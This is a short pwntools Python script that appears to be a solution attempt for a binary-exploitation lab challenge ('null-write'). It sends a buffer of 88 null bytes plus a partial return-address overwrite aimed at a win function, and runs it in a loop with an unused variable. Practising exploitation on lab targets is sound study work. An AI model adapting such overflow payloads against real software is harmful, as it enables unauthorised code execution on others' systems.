from pwn import *

offset = 80
win_bypass = 0x1704
save_addr = 0x19d4
main_addre = 0x194e

for i in "0123456789abcdef":
    r = process("/challenge/binary-exploitation-null-write")
    payload = 88 *b'\x00' + b'\x04' + bytes.fromhex("57")
    print(r.recvline())
    r.send(payload)
    # r.interactive()
    print(r.recvline())
    try:
        print(r.recvline(timeout=2))
        print(r.recvline(timeout=2))
    except:
        print('walo')